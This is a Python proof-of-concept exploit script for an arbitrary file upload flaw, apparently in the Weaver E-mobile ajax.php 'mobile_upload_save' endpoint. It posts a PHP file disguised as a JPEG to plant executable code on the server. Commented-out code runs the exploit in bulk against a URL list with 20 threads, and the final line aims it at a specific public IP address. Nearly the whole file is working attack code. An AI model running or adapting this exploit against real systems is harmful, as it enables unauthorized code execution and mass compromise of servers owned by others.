import requests
import warnings
warnings.filterwarnings("ignore")

def poc(u):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
    }


    data = '------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\nContent-Disposition: form-data; name="upload_quwan"; filename="pleasedeleteme.php."\r\nContent-Type: image/jpeg\r\n\r\n<?php var_dump(521);?>\r\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt'

    url = f'{u}/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
    
    proxy = {
    'http':'http://127.0.0.1:7890',
    'https':'https://127.0.0.1:7890',
    }
    try:
        response = requests.post(url, headers=headers, data=data,proxies=proxy, timeout=5, verify=False)
        
        if response.status_code == 200  and "html" not in response.text:
            print(url)
            print(response.text)
        else:
            print(url,response.status_code)

    except requests.exceptions.ReadTimeout as timeout:
        print("访问超时")

# from concurrent.futures import ThreadPoolExecutor
# # 批量检测
# with open('urls.txt', 'r') as file:
#     urls = [u.strip() for u in file.readlines()]
# with ThreadPoolExecutor(max_workers=20) as executor:
#     executor.map(poc, urls)

# with open('urls.txt', 'r') as file:
#     urls = [u.strip() for u in file.readlines()]

# for u in urls:
#     poc(u)

poc("http://210.36.200.20:8010")